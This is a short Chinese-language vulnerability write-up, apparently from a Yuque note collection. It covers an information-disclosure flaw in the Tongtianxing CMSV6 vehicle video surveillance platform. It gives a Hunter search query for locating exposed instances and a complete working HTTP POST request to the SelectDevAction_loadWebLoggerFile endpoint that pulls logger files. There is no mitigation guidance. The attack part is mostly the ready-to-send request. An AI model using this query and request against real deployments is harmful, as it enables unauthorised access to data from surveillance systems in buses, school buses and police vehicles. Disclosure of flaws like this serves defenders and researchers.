# 通天星CMSV6车载视频监控平台 SelectDevAction_loadWebLoggerFile存在信息泄露漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台SelectDevAction_loadWebLoggerFile存在信息泄露漏洞。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/TXQxrAkI_D_RFddr/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-856466.png)

# 四、漏洞复现
```plain
POST /808gps/LoggerManagement/SelectDevAction_loadWebLoggerFile.action HTTP/1.1
Host: 
Content-Length: 103
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
jsessionId: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=87F04E406314662DEF40451BC5114457
Connection: close

page=1&rp=15&query=&qtype=&pagin=%257B%2522currentPage%2522%253A1%252C%2522pageRecords%2522%253A15%257D
```

![1706862603015-66ad1edb-9862-424f-8dd7-5ceef0e610f9.png](./img/TXQxrAkI_D_RFddr/1706862603015-66ad1edb-9862-424f-8dd7-5ceef0e610f9-748844.png)



> 更新: 2024-12-28 13:05:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xfqhkpt5end64g2q>